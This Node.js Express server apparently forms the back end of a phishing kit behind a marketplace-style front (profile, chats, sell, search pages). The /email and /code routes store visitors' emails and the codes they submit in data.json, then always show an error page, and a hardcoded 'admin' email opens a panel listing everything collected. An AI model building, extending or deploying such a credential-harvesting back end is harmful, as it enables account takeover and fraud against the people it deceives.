const express = require('express')
const app = express()
const path = require('path')
const fs = require('fs')
const session = require('express-session')
const ejs = require('ejs');


app.use(express.urlencoded({ extended: true }))
app.use(express.json())
app.use(session({
    secret: 'secret',
    resave: false,
    saveUninitialized: true
}));


app.set('view engine', 'ejs');
app.set('views', path.join(__dirname));


app.get('/admin', (req, res) => {
    const filePath = path.join(__dirname, 'data.json');

    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Ошибка чтения файла:', err);
            res.status(500).send('Ошибка чтения файла');
            return;
        }

        const jsonData = JSON.parse(data);

        res.render('admin', { jsonData });
    });
});


app.post('/email', (req, res) => {
    let { email } = req.body;
    let admin = `wedh23823bjhbwdj293olwd823nkjww`;
    let jsonPath = path.join(__dirname, 'data.json');
    req.session.email = email;

    let allData = JSON.parse(fs.readFileSync(jsonPath));
    allData.push({ email: email });

    fs.writeFile(jsonPath, JSON.stringify(allData, null, 4), (err) => {
        if (err) {
            console.log('Ошибка записи в файл:', err);
            res.status(500).send('Ошибка записи в файл');
            return;
        }

        if (email === admin) {
            res.redirect('/admin')
        } else {
            res.sendFile(path.join(__dirname, 'code.html'));
        }
    });
});

app.post('/code', (req, res) => {
    let { code } = req.body;
    let jsonPath = path.join(__dirname, 'data.json');
    let emailData = req.session.email;

    let allData = JSON.parse(fs.readFileSync(jsonPath, "utf8"));
    
    for (let item of allData) {
        if (item.email === emailData) {
            item.code = code;
            break;
        }
    }

    fs.writeFileSync(jsonPath, JSON.stringify(allData, null, 4));
    res.sendFile(path.join(__dirname, 'error.html'));
});





app.get('/profile', (req, res) => {
    res.sendFile(path.join(__dirname, 'profile.html'))
})

app.get('/chats', (req, res) => {
    res.sendFile(path.join(__dirname, 'chats.html'))
})

app.get('/sell', (req, res) => {
    res.sendFile(path.join(__dirname, 'sell.html'))
})

app.get('/search', (req, res) => {
    res.sendFile(path.join(__dirname, 'search.html'))
})

app.get('/code', (req, res) => {
    res.sendFile(path.join(__dirname, 'code.html'))
})

app.get('/', (req, res) => {
    res.redirect('/profile')
})

app.listen(3000, () => {
    console.log('server is running: http://localhost:3000')
})